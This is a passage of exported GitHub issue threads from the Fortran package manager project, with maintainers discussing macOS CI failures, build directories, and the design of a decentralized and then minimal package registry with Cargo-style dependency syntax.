                    "text": "We should document these choices and why we chose it. Then we can close this. Because this will come up again.\n\u2026\nOn Wed, Apr 29, 2020, at 9:30 PM, Brad Richardson wrote:\n\n\n I think this is pretty well settled now. Should we close this?\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#39 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWES7J5OW4SJVYLBDYLRPDWENANCNFSM4K2TQKOQ>."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 06:41:18+00:00",
                    "text": "This issue does not have much info anyway and it is documented in the tutorial a bit, so let's close this one."
                }
            ]
        },
        {
            "number": 38,
            "user": "certik",
            "date": "2020-02-23 18:31:31+00:00",
            "title": "Implement common_prefix",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-02-23 18:40:48+00:00",
                    "text": "There is a failure on Windows due to / vs \\. I am glad we test it. I have to investigate and fix it."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 06:53:58+00:00",
                    "text": "I am going to close this one for now."
                }
            ]
        },
        {
            "number": 37,
            "user": "certik",
            "date": "2020-02-20 21:37:08+00:00",
            "title": "CI: Do not install GFortran (already present)",
            "text": "Implemented in actions/virtual-environments#202 (comment).",
            "comments": []
        },
        {
            "number": 36,
            "user": "certik",
            "date": "2020-01-31 19:59:25+00:00",
            "title": "How to handle packages that do not have `fpm.toml`",
            "text": "There will be a lot of packages that do not have fpm.toml. Here is my suggested approach how to handle that:\n\n\nEncourage every package to use fpm.toml and to use fpm.\n\n\nThose packages that do not use it yet could be handled as follows: we will maintain a version (fork) at GitHub or GitLab that includes the fpm.toml. It will be this fork that would be used with fpm. From fpm's perspective, each package always contains fpm.toml.\n\n\nThe alternative to (or modification of) 2. is to allow fpm.toml to specify where to find sources of the actual package. So our GitLab package can be just one file fpm.toml that would list the metadata and where to download the sources plus any patches to them.\n\n\nIn particular, here is my plan: I will start with forking the packages listed at #17 and implementing fpm.toml together with any modifications that might be needed. I will not submit a PR back initially, but rather simply get my forks working well with fpm, and test it all out and get some usage. Then, as things start to get more serious and the fpm tool matures, we can easily send a PR against the upstream package and start the discussion with upstream authors if they would be willing to use fpm and maintain fpm.toml themselves. And depending on how this conversation goes, we'll either do just 2., or if we need to, we can also implement 3. in fpm. I expect that upstream authors will give us a list of features that they need fpm to have implemented, and once we do, they would be willing to use it.",
            "comments": []
        },
        {
            "number": 35,
            "user": "certik",
            "date": "2020-01-31 19:25:52+00:00",
            "title": "Full package registry",
            "text": "After #34 is implemented, we can discuss how to implement a full package registry similar to https://crates.io. It would be an extension of #34, which would also include hosting of the tarballs, and collecting usage statistics and other things. I think the solution in #34 can be evolved into this.",
            "comments": []
        },
        {
            "number": 34,
            "user": "certik",
            "date": "2020-01-31 19:22:34+00:00",
            "title": "Minimal metadata registry",
            "text": "After #33 is implemented, the next step is to implement a minimal metadata registry. Here is one way to do that:\n\nHave repository https://github.com/fortran-lang/package-registry that would contain a simple JSON file of this form which is the package registry:\n\n[{\n    \"name\": \"stdlib\",\n    \"versions\": [\n        {\"version\": \"0.3.4\", \"url\": \"https://github.com/fortran-lang/stdlib/archive/0.3.4.tar.gz\"},\n        {\"version\": \"0.3.5\", \"url\": \"https://github.com/fortran-lang/stdlib/archive/0.3.5.tar.gz\"},\n    ]\n}, {\n    \"name\": \"bspline\",\n    \"versions\": [\n        {\"version\": \"6.0.0\", \"url\": \"https://github.com/jacobwilliams/bspline-fortran/archive/6.0.0.tar.gz\"},\n        {\"version\": \"5.4.2\", \"url\": \"https://github.com/jacobwilliams/bspline-fortran/archive/5.4.2.tar.gz\"},\n    ]\n}]\n\n\nWe will then have scripts that take this JSON file and download the actual metadata for each package version. So for example, to obtain the metadata for the package bspline version 5.4.2, it would download the tarball https://github.com/jacobwilliams/bspline-fortran/archive/5.4.2.tar.gz, unpack and it would read its fpm.toml, which would contain all the metadata such as short and long description, the list of dependencies, and other things. Then we can automatically create a website which would list all this metadata. This generated website would contain a generated file metadata.json, which the fpm tool can then download to obtain a searchable data base of packages (fpm search).\n\n\nTo add a new package to registry, just a new simple entry must be made to the above JSON file by hand, say by issuing a PR against the repository.\n\n\nLater we can automate things more, similarly to how conda-forge works (https://conda-forge.org/docs/maintainer/adding_pkgs.html), where to put a new package in, a PR is sent against https://github.com/conda-forge/staged-recipes/, where the CI checks initial quality and that the package builds, and then if it gets merged, the CI actually creates a new repository for the package etc. In our case, we could have a staging repository, and if a PR is merged, the CI would correctly update the above JSON file.\n\n\nWe can discuss if the JSON file should also contain all the metadata from fpm.toml directly. The advantage of the above approach is that it is not redundant, the JSON only contains the minimal amount of information that can be edited and maintained by hand, and if you want more, you download the tarball and read its fpm.toml, which will be done automatically in the step 2.\nOverall, this minimal package registry only contains a minimal JSON file. The actual tarballs and metadata are hosted elsewhere. After this is well implemented and works, we can evolve it into a full package registry (#35).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-31 19:35:29+00:00",
                    "text": "The thing to discuss here, which we didn't have to worry about in #33 is what to do if multiple people want to have a bspline package. Should we require to prefix it with the github organization/user name, as in jacobwilliams/bspline, or what do we do if somebody submits (registers) the bspline name, but there will later be a better, more widely used and popular bspline package. If we simply switch the url for bspline from the old package to the new package, then all kinds of packages that already depend on the old bspline package would break. One approach could be that since most Fortran packages will be in this ecosystem, we would know which packages depend on it, so we could correctly update them all (and rename bspline to bspline_legacy). For example Debian had to rename the git package, as it wasn't the usual git, but some older package that just happened to be called git before the version control system came along. In our case I can see this happening for every popular package name such as \"mesh\", \"utils\", \"spline\", ... So we should have some policy how to handle such things. One such policy can be that we would evaluate the usage and a number of github stars, and allow the most used package to have the more popular name."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-31 19:49:28+00:00",
                    "text": "Great, thanks! The step 2 in the proposed flow assumes that the package will include its fpm.toml. However, this is only possible if the package has an active maintainer that is willing to maintain the package-specific fpm.toml. Would this not preclude fpm from downloading tarballed packages from the wild, like SOFA for example?\nIf the community maintains all metadata needed to download and build the package in the registry, it would broaden the ecosystem of packages fpm could work with."
                },
                {
                    "user": "certik",
                    "date": "2020-01-31 20:00:58+00:00",
                    "text": "@milancurcic your last comment seems to be a bit orthogonal issue, so I created #36 for it to discuss just this aspect of how fpm is designed."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-10 18:52:48+00:00",
                    "text": "Now that there's a package that can be built with fpm, let's revisit this issue which is a requirement for installing a package from a remote location such as a GitHub repo.\nI think @certik's idea of a minimal registry is a good start. We'll also need a description field, so that fpm list not just names of packages, but also there (one-line) descriptions, just like other package managers.\nAnother doubt I have is whether this should be a separate repository, rather than part of this repository. In my opinion, keeping it in this repo is simpler because:\n\nOne doesn't need to maintain a separate repo for the registry\nLess confusing for newcomers--there's only one repo (this one), whether you want to contribute to the code, or submit a package to the registry\nIssues+PR system allows clean separation between fpm issues and package submissions to the registry. So we don't need to separate them in another way.\n\nfpm would need to update its registry cache in either approach.\n@certik are there benefits of having a registry in a separate repo, or is it more an esthetic thing?\n\nSeparate vs. same repo question aside, how would this look like from the UI perspective? For simplicity, let's forget about search for now. Let's say we just want to be able to list available packages. This could be something like:\nfpm list\n  datetime-1.7.0 -- Date and time manipulation\n  openblas-0.3.9 -- Optimized BLAS library based on GotoBLAS2\n  stdlib-0.1.0 -- Fortran standard library\n\nUnder the hood, fpm:\n\nFetches the registry\nParses it\nLists individual packages and latest version so you get the above\n\nWe can discuss how to list individual available versions at a later time. Let's try to solve the minimal problem first."
                },
                {
                    "user": "certik",
                    "date": "2020-05-10 19:13:31+00:00",
                    "text": "My initial gut feeling is not to put packages in this repository. Although Spack does it like that and I think it works for them.\n\nEither way, fpm needs to download the packages from the internet, unless we do it like Spack, which reads them from a local repository checkout.\n\nI think since we are in a prototype mode, let's just put everything in this repo. Get things working for a few packages with dependencies and then let's figure out what to do for production version of fpm.\n\nLet's also understand well how Cargo does it and why something does not work for us. Let's also document our reasoning.\n\u2026\nOn Sun, May 10, 2020, at 12:53 PM, Milan Curcic wrote:\n\n\n Now that there's a package that can be built with fpm\n <https://github.com/wavebitscientific/datetime-fortran>, let's revisit\n this issue which is a requirement for installing a package from a\n remote location such as a GitHub repo.\n\n I think @certik <https://github.com/certik>'s idea of a minimal\n registry is a good start. We'll also need a description field, so that\n fpm list not just names of packages, but also there (one-line)\n descriptions, just like other package managers.\n\n Another doubt I have is whether this should be a separate repository,\n rather than part of this repository. In my opinion, keeping it in this\n repo is simpler because:\n\n  * One doesn't need to maintain a separate repo for the registry\n  * Less confusing for newcomers--there's only one repo (this one),\n whether you want to contribute to the code, or submit a package to the\n registry\n  * Issues+PR system allows clean separation between fpm issues and\n package submissions to the registry. So we don't need to separate them\n in another way.\n fpm would need to update its registry cache in either approach.\n\n @certik <https://github.com/certik> are there benefits of having a\n registry in a separate repo, or is it more an esthetic thing?\n\n Separate vs. same repo question aside, how would this look like from\n the UI perspective? For simplicity, let's forget about search for now.\n Let's say we just want to be able to list available packages. This\n could be something like:\n\n `fpm list\n   datetime-1.7.0 -- Date and time manipulation\n   openblas-0.3.9 -- Optimized BLAS library based on GotoBLAS2\n   stdlib-0.1.0 -- Fortran standard library\n `\n Under the hood, fpm:\n\n  1. Fetches the registry\n  2. Parses it\n  3. Lists individual packages and latest version so you get the above\n We can discuss how to list individual available versions at a later\n time. Let's try to solve the minimal problem first.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#34 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGTEEJIDXEN5FKTROTRQ3ZYZANCNFSM4KOMKF7A>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 02:33:50+00:00",
                    "text": "I think we should do what Cargo does with crates.io and have a separate repository for packages. Packages are stored there as tarballs and you can interact with it via a simple REST API. This gives us several advantages.\n\nWe can put certain checks in place for packages published to the official repo\nAnyone else can stand up their own repo, and just conform to the same API (i.e. private repos). We can even open-source the code for it\nAnyone else can write whatever tools they like to interact with it\n\nUntil we can get such a service stood up, we should endeavor to keep a list in the fpm README of known packages"
                },
                {
                    "user": "certik",
                    "date": "2020-05-11 13:31:39+00:00",
                    "text": "@everythingfunctional what you are proposing is #35. I think we all agree on that one. We also agree that is a lot of work, and so right now we are discussing what to do until we get there.\nSo far the proposals are:\n\nDocument available packages in the README\nCreate a manual metadata registry (this issue #34)\n\nI think we should definitely try the manual metadata registry, not just a README, as it would allow us to almost get the full experience of #35.\n\nProgressing the discussion further, I proposed above how such a JSON file (if we use JSON) could look like. Milan suggested it also needs a description field. I don't think that's a good idea for the following reasons:\n\nThe description is another thing to handle manually\nIt can change between versions, so it would have to be attached to each version\nIt's duplicate from the upstream package's toml file, another thing to keep in sync.\n\nThe reason I think why Milan proposed it is to make it possible for fpm to print packages with more information about them. I agree fpm should be able to do that, but not in the above proposed way.\nThe same with putting this metadata in this repository.\nRather, we should plan out how to we get to fixing #35. And then in this issue we should do work that is aligned with it.\nSo here I am proposing a draft of such a plan:\n\nThe issue #35 is mainly about hosting tarballs. But everything else about the registry can be done as part of this issue\nHave a separate repository called fpm_registry\nThe fpm_registry will have a JSON file (with the format above)\nTo submit a package (version) to the registry, people send a PR towards fpm_registry to update the JSON file ---- and just like when submitting to pypi or crates, you do not fill out a separate description field, you should not here either --- that gets filled out automatically from fpm.toml (see below)\nThen we have a separate repository plus CI pipeline that automatically takes this JSON file and:\n\ndownloads each package (it can cache old info, so only needs to download new packages), extracts full metadata (description, dependencies, etc.) and uses that information to:\ncreate a nice website with a page for each package that looks like crates.io (has a description, links to dependencies, and any other useful metadata extracted from fpm.toml)\ncreate a \"registry JSON\", which has full metadata for each package, including description\n\n\nfpm gets updated to be able to download this \"registry JSON\" from this auto generated website, and use this \"registry JSON\" to print info about packages, what packages depend on, etc.\n\nThen later on, to take this to implement the full #35, the only thing missing really is just hosting of tarballs. Everything else I think can be reused.\nThe above plan also allows other people (companies) to host their own registry\n\nThe above plan can be started by simply:\n\ncreate an fpm_registry with the minimal JSON\nadd a CI that takes this JSON and creates \"registry JSON\" and hosts it online\nupdate fpm to download and work with this \"registry JSON\"\n\nThese are three simple steps that I can even help implement, I've done something similar for LFortran. This can then be naturally expanded to also create a nice website."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 14:20:14+00:00",
                    "text": "I like that plan. It's usable to the point that even if we don't end up moving to a tarball hosting registry, I don't think anybody would even mind."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-11 15:44:57+00:00",
                    "text": "I like this plan as well. So actually this minimal registry is not what's read by fpm, but is read by another program that outputs the \"production\" registry with complete information. This is a good idea because then we don't have to assume ahead of time what is all the metadata that we'll need.\nI realize now that this issue is a step 2 from a 3-step #33. I will write there for now."
                },
                {
                    "user": "certik",
                    "date": "2020-07-20 20:36:37+00:00",
                    "text": "Now when #33 is (mostly) done, let's tackle this issue.\n@milancurcic, @everythingfunctional, let's keep the (centralized) registry in a separate repository. How should it be named? Some ideas:\nhttps://github.com/fortran-lang/package-registry\nhttps://github.com/fortran-lang/fpm-package-registry\nhttps://github.com/fortran-lang/fpm-registry\nI don't really have a preference. This repository will have a JSON or rather a TOML file where people will submit their packages using a GitHub PR. This file will only contain the name of the package, the version and url (everything else is redundant, so should not be there). There can also be the \"latest\"/\"development\" version that would simply download the latest git (and thus things like description can change in this latest version, so that should not be part of this TOML file, but rather only in the upstream repository inside fpm.toml, and we process it automatically).\nWe'll then build CI jobs to process this JSON/TOML file to:\n\ncreate rich metadata JSON file that collects things like descriptions, license, website, logo url (later on), etc. by downloading the package (ensuring it actually downloads...) and reading the fpm.toml inside it.\nadd a section to our fortran-lang.org website (ccing @LKedward) that would probably use the json metadata from the previous point\nimplement fpm search that would use the json metadata from the first bullet point to implement search (so that you can search through the description of the package, not just the name)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-20 22:46:58+00:00",
                    "text": "Looks good. I like fpm-registry.\nI'm unclear about versions. If this file includes the version number, which version is it? The latest? Perhaps all versions that are fpm-enabled? Or should the version metadata be the responsibility of the package itself?"
                },
                {
                    "user": "certik",
                    "date": "2020-07-20 22:50:22+00:00",
                    "text": "Re version: all versions that are fpm enabled. This is hard to figure out automatically, as typically old versions are just some git tags, and maybe not all of them are valid / working, etc. So I figured each version has to be explicitly specified, and one of the version can be \"latest git commit\"."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-20 23:03:15+00:00",
                    "text": "I like fpm-registry.\nI worry a bit about having to specify every version. But as this is more of a stop-gap measure, I guess it's ok."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 23:07:59+00:00",
                    "text": "Ok, I created https://github.com/fortran-lang/fpm-registry and gave access to everybody with push access. We can start submitting PRs against that repository to get it up."
                },
                {
                    "user": "certik",
                    "date": "2020-07-21 23:21:17+00:00",
                    "text": "We can continue the discussion at fortran-lang/fpm-registry#1 and other issues there."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:23:00+00:00",
                    "text": "Closing as this has been implemented at https://github.com/fortran-lang/fpm-registry/, further discussion can continue there."
                }
            ]
        },
        {
            "number": 33,
            "user": "certik",
            "date": "2020-01-31 04:18:26+00:00",
            "title": "Decentralized package management",
            "text": "Rust allows the packages to be decentralized, they do not have to be listed at https://crates.io/.\nThe Go language does not even have a centralized package registry at all, see this blog post that explains it in the section \"Package Management\":\nhttps://nullprogram.com/blog/2020/01/21/\n\nModules are named by a module path that includes its network location. This means there\u2019s no land grab for popular module names.\n\nI don't like the Go's model that the name of the package is the url, I prefer the Rust model where a package has a simple name, but you specify where it can be downloaded. The end result is the same. (Overall, the Rust package management seems much more thought out, and it seems they fixed the issues that Go is tackling long time ago.)\nI want to implement the same approach for fpm. That will allow us to build an ecosystem of packages for Fortran, without a \"goldrush\" to reserve a popular package name in a centralized registry. Then, as we have a healthy ecosystem of packages, we can add a centralized registry later.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-31 18:45:30+00:00",
                    "text": "Overall I like this direction. However I'm confused about how this works in practice. Perhaps it's just a terminology issue.\nLike PyPI, Crates serves both as a registry (metadata), and code distribution.\nI agree that it's not feasible for fpm to host and distribute code. It's a huge ordeal and technical challenge.\nHowever, do you also mean that fpm wouldn't have a centralized metadata registry? If yes, how would a newcomer to Fortran and fpm search for packages? It seems to me that if you don't have some centralized metadata registry, the user would need to know what package they need and how to download it."
                },
                {
                    "user": "certik",
                    "date": "2020-01-31 19:44:11+00:00",
                    "text": "I think it's a step by step process, we start with the step 1. below, then we progress to step 2. and then to step 3.:\n\n\nThis issue #33: indeed there is no centralized metadata registry. The advantage is that there is no \"goldrush\" to reserve popular names in a centralized registry. Initially there is no package search (newcomers must know the package name), but I can imagine actually creating a search --- all we need for people to submit urls of packages out there, and since each is using fpm.toml, we can then create a search of those decentralized packages.\n\n\nIssue #34: minimal centralized registry. Allows a natural fpm search capability.\n\n\nIssue #35: both registry and code distribution.\n\n\nIf step 1. is fully developed, there can actually be a \"decentralized package registry\". It would work just like described in step 2. (see the issue #34 for details), except that there would not be a centralized name for a package, so people could submit various packages (as url) that can have the same name. Then fpm search would give you all the packages with urls to put into your fpm.toml. We can curate this list as a community to prevent spam and malicious code."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-11 15:51:08+00:00",
                    "text": "Coming from #34, let's discuss how the step 1 (no centralized registry) works. This means we don't need fpm search and fpm list.\nLet's say I just want to fpm install with datetime-fortran as a dependency. I know the name of the package. I don't (and shouldn't) know the URL of the package.\n@certik How does this work? It seems to me that we need some metadata even at this stage.\nOr is the user expected to enter something like:\n[dependencies]\nname = \"datetime\"\nurl = \"https://github.com/wavebitscientific/datetime-fortran\"\nto their fpm.toml?\nBoth approaches seem okay to me for now (latter is simpler), I'm just not clear what's your idea how this works."
                },
                {
                    "user": "certik",
                    "date": "2020-05-11 16:11:38+00:00",
                    "text": "The step 2 in #34 is what we should eventually do, and then step 3 in #35. It looks like we got agreement on both.\nYou can only install datetime-fortran (btw, it should probably just be called datetime) without knowing the url at the step 2., because you need the registry to get the url.\nSo let's start with step 1 in this issue #33. In here I propose to do exactly what Cargo does. Say I want to use datetime in my program. Here are details about Cargo's syntax: https://doc.rust-lang.org/cargo/reference/specifying-dependencies.html, so let's do what they do:\nI would have this in my fpm.toml:\n[dependencies]\ndatetime = \"1.7.0\"\nOnce step 2 is implemented, then fpm would have a default registry, and you can also specify your own registry either on a command line or explicitly:\n[dependencies]\ndatetime = { version = \"1.7.0\", registry = \"my-registry\" }\nUntil then, in this step 1, we do not have a registry, so you have to also tell it where it can download the datetime package directly. As explained at the webpage, Cargo only uses the version field if it downloads from a registry, otherwise it ignores it if it downloads it directly from a git repository or a local path. We can start with that approach, if we need more, we can modify that behavior. So here is how you would do it:\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\", tag = \"v1.7.0\" }\nHowever, since we want to move to a registry, and since most projects follow the convention of prefixing the version by v in the git tag (I do in all my projects, and I noticed you do too), I am proposing this natural extension of what Cargo does:\n\nIf git and version is specified, it will checkout a tag named v + version from that git repository\n\nSo with this extension, you would do:\n[dependencies]\ndatetime = { version = \"1.7.0\", git = \"https://github.com/wavebitscientific/datetime-fortran\" }\nAnd then later once we move to a registry, you just remove the git field, but keep the version and it would do the right thing."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-05-11 16:27:04+00:00",
                    "text": "Cargo actually has a different meaning for this:\n[dependencies]\ndatetime = { version = \"1.7.0\", git = \"https://github.com/wavebitscientific/datetime-fortran\" }\nThis means that when working in this package, it will download the latest master version of datetime, but for a package that depends on this one, the transitive dependency is version 1.7.0 of datetime from the default registry.\nI'm not saying we definitely shouldn't do what you're suggesting, but if we do it will preclude us from ending up with the same functionality as Cargo. It would also impose a tagging convention on people's repositories that will be unnecessary once we have a proper registry. Also, relying on git tags for official release version identifiers is wide open for abuse."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-05-11 16:51:00+00:00",
                    "text": "Perfect, this is what we're after as a first step:\n[dependencies]\ndatetime = { git = \"https://github.com/wavebitscientific/datetime-fortran\", tag = \"v1.7.0\" }\nThis alone will already be a huge improvement over the current state of things.\nWe can work out the nuances of version and registry behavior as we go."
                },
                {
                    "user": "certik",
                    "date": "2020-05-11 16:53:16+00:00",
                    "text": "@everythingfunctional I am glad you noticed that. Let's not do my proposal then, just use tag. I think it is good enough and we will have a minimal registry soon anyway."
                },
                {
                    "user": "certik",
                    "date": "2020-07-20 20:25:03+00:00",
                    "text": "@everythingfunctional, @milancurcic I think this issue is fixed now?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-20 20:36:40+00:00",
                    "text": "Yes, IMO this is good to close."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-20 23:06:28+00:00",
                    "text": "Yep, go ahead and close it."
                }
            ]
        },
        {
            "number": 32,
            "user": "certik",
            "date": "2020-01-28 06:37:38+00:00",
            "title": "Implement dependencies",
            "text": "Just like in Cargo.\nWe should work on this after #25 is fixed.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:40:01+00:00",
                    "text": "This seems to be related to the removed Rust version."
                }
            ]
        },
        {
            "number": 31,
            "user": "certik",
            "date": "2020-01-28 06:34:52+00:00",
            "title": "Add tests for different build directories",
            "text": "We need to add more tests:\n\n test that the default directory is target (in some temporary directory)\n test other locations of the build directory (will require to construct relative paths in CMakeLists.txt)",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:39:44+00:00",
                    "text": "This seems to be related to the removed Rust version."
                }
            ]
        },
        {
            "number": 30,
            "user": "certik",
            "date": "2020-01-28 05:54:47+00:00",
            "title": "Cleanup the test program",
            "text": "",
            "comments": []
        },
        {
            "number": 29,
            "user": "certik",
            "date": "2020-01-28 01:55:16+00:00",
            "title": "Use Command::new() instead of Command::cargo_new()",
            "text": "This seems to actually fix the issue #16 as documented at:\nhttps://users.rust-lang.org/t/github-actions-randomly-kill-a-test-program/37255/6",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-28 02:02:34+00:00",
                    "text": "I need to figure out how to obtain the absolute path to fpm in a platform independent way, and then pass it in. But this approach seems to be able to fix it."
                },
                {
                    "user": "certik",
                    "date": "2020-01-28 04:59:06+00:00",
                    "text": "Tests pass. I am now testing that this truly fixes the macOS bug at certik#14."
                },
                {
                    "user": "certik",
                    "date": "2020-01-28 05:34:37+00:00",
                    "text": "It works. I think this really fixed it! I am going to merge this and we'll watch it if it ever fails again."
                }
            ]
        },
        {
            "number": 28,
            "user": "certik",
            "date": "2020-01-25 17:44:14+00:00",
            "title": "Add Cargo.lock",
            "text": "This is the recommended approach for an application.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-25 18:29:18+00:00",
                    "text": "I was surprised by this, but indeed the docs recommend not committing Cargo.lock for a library and committing it for an application. Link for anybody like me who wondered about this:\nhttps://doc.rust-lang.org/cargo/faq.html#why-do-binaries-have-cargolock-in-version-control-but-not-libraries"
                }
            ]
        },
        {
            "number": 27,
            "user": "certik",
            "date": "2020-01-25 17:34:00+00:00",
            "title": "Install cmake using apt-get",
            "text": "",
            "comments": []
        },
        {
            "number": 26,
            "user": "certik",
            "date": "2020-01-18 17:31:51+00:00",
            "title": "Build in a target directory",
            "text": "Fixes #24.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-18 18:01:01+00:00",
                    "text": "I just need to fix it up on macOS and Windows."
                }
            ]
        },
        {
            "number": 25,
            "user": "certik",
            "date": "2020-01-18 15:05:48+00:00",
            "title": "Build in temporary directory for tests",
            "text": "After #24 and #31 is fixed, set the --target-dir to a temporary directory for tests. That way multiple tests can reuse the same source directory for different tests, in parallel.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-09 21:45:19+00:00",
                    "text": "This seems to be related to the removed Rust version."
                }
            ]
        },
        {
            "number": 24,
            "user": "certik",
            "date": "2020-01-18 15:05:05+00:00",
            "title": "Put everything into target/",
            "text": "Put the CMakeLists.txt into target/, and ensure the source directory is not polluted at all.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-28 06:35:12+00:00",
                    "text": "The basic issue is fixed, but more tests need to be added (#31)."
                }
            ]
        },
        {
            "number": 23,
            "user": "certik",
            "date": "2020-01-18 15:00:29+00:00",
            "title": "Implement --target-dir",
            "text": "",
            "comments": []
        },
        {
            "number": 22,
            "user": "certik",
            "date": "2020-01-18 06:39:01+00:00",
            "title": "Parse fpm.toml",
            "text": "",
            "comments": []
        },
        {
            "number": 21,
            "user": "certik",
            "date": "2020-01-18 00:02:55+00:00",
            "title": "Print the full Rust stacktrace on error",
            "text": "",
            "comments": []
        },
        {
            "number": 20,
            "user": "certik",
            "date": "2020-01-17 23:36:35+00:00",
            "title": "macOS: repeat the test up to 2x if it fails",
            "text": "This is a workaround for #16. It turns out that if the executable fails\nto run, just rerunning all tests typically fixes it.",
            "comments": []
        },
        {
            "number": 19,
            "user": "certik",
            "date": "2020-01-17 20:30:08+00:00",
            "title": "CI repr 6",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-17 20:54:20+00:00",
                    "text": "My apologies, meant to create this one: certik#5"
                }
            ]
        },
        {
            "number": 18,
            "user": "certik",
            "date": "2020-01-16 05:56:24+00:00",
            "title": "Better reporting on terminated processes",
            "text": "This will eventually help fix #16.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-16 06:45:48+00:00",
                    "text": "I think this PR works as expected. In https://github.com/fortran-lang/fpm/pull/18/checks?check_run_id=392603247 it reports more information about the failure due to #16:\nrunning 3 tests\ntest test_help ... ok\ntest test_2 ... FAILED\ntest test_1 ... ok\n\nfailures:\n\n---- test_2 stdout ----\nstatus: signal: 9\nstdout: \nstderr: \n##[error]thread 'test_2' panicked at 'INTERRUPTED with signal: 9', tests/cli.rs:35:21"
                }
            ]
        },
        {
            "number": 17,
            "user": "certik",
            "date": "2020-01-15 22:18:24+00:00",
            "title": "Candidate packages to get working",
            "text": "Here are a few good candidate packages to get working with fpm first, that are relatively simple (and so possible to package soon), yet very useful.\nPure Fortran (Simple)\n\n https://github.com/wavebitscientific/functional-fortran\n https://github.com/jacobwilliams/bspline-fortran\n https://github.com/fortran-lang/stdlib\n https://github.com/astrofrog/fortranlib\n https://github.com/certik/fortran-utils/\n https://github.com/wavebitscientific/datetime-fortran\n https://github.com/jacobwilliams/pyplot-fortran\n\nPure Fortran (More Complex)\n\n https://github.com/Reference-LAPACK/lapack\n https://github.com/opencollab/arpack-ng\n https://github.com/jacobwilliams/json-fortran\n https://github.com/jacobwilliams/Fortran-Astrodynamics-Toolkit\n https://github.com/Goddard-Fortran-Ecosystem/pFUnit\n https://github.com/szaghi/StringiFor (Lots of dependencies)\n\nFortran with non-Fortran dependencies\n\n https://github.com/scivision/h5fortran\n https://github.com/scivision/nc4fortran\n https://github.com/SHTOOLS/SHTOOLS\n https://github.com/unidata/netcdf-fortran\n\nAnd obviously any other more complicated package from https://github.com/fortran-lang/stdlib/wiki/List-of-popular-open-source-Fortran-projects.\nAny other candidates?",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-16 03:02:29+00:00",
                    "text": "I added nc4fortran and netcdf-fortran to the list."
                }
            ]
        },
        {
            "number": 16,
            "user": "certik",
            "date": "2020-01-15 15:02:32+00:00",
            "title": "The fpm binary gets interrupted at the CI (macOS)",
            "text": "There is a bug at our CI that I haven't been able to figure out yet. Here is an example of it: https://github.com/fortran-lang/fpm/runs/390475601.\nHere is what I know:\n\n\nIt only happens on macOS, never on Linux or Windows\n\n\nRestarting the build typically fixes it (sometimes it fails 2x or 3x in a row, but eventually it always passes)\n\n\nThe cargo test runs in parallel by default, so I set -j1 to run in serial. That seemed to improve how often it fails (although I could be wrong on that). It still fails sometimes however, so the actual bug is still there.\n\n\nThe error is:\n\n\nthread 'test_2' panicked at 'Unexpected failure.\ncode=<interrupted>\nstderr=``````\ncommand=`\"/Users/runner/runners/2.163.1/work/fpm/fpm/target/x86_64-apple-darwin/debug/fpm\" \"build\"`\ncode=<interrupted>\nstdout=``````\nstderr=``````\n', /Users/runner/.cargo/registry/src/github.com-1ecc6299db9ec823/assert_cmd-0.10.2/src/assert.rs:148:17\n\nWhich is caused by the assert_cmd package, which just uses the Rust's std::process::Command, when the output command did not succeed, but it also failed to retrieve the error code, which according to the documentation means the process was interrupted by the system (with some signal like SIGKILL).",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-15 15:31:20+00:00",
                    "text": "And here it failed in master (https://github.com/fortran-lang/fpm/runs/391281163) after merging #15 that passed. So we have to figure this out."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 15:35:41+00:00",
                    "text": "Is there anybody with a Mac that can reproduce this locally?"
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 15:39:25+00:00",
                    "text": "I tried it on a macOS yesterday locally, and I can't reproduce it. So we have to Debug it at the CI itself (as I have done in #14), which is quite time consuming."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 06:48:29+00:00",
                    "text": "As reported in #18 (comment), the process gets interrupted with signal 9 (SIGKILL). I suspected that above, but it's nice to have a proof. For some reason macOS kills the fpm process."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 07:03:41+00:00",
                    "text": "This might be a bug at GitHub, so I reported it at https://github.community/t5/GitHub-Actions/GitHub-Actions-on-macOS-randomly-kill-my-test-program/m-p/43526#M5414."
                },
                {
                    "user": "certik",
                    "date": "2020-01-16 18:28:12+00:00",
                    "text": "I am trying to reliably reproduce this bug in certik#1."
                },
                {
                    "user": "certik",
                    "date": "2020-01-17 21:44:30+00:00",
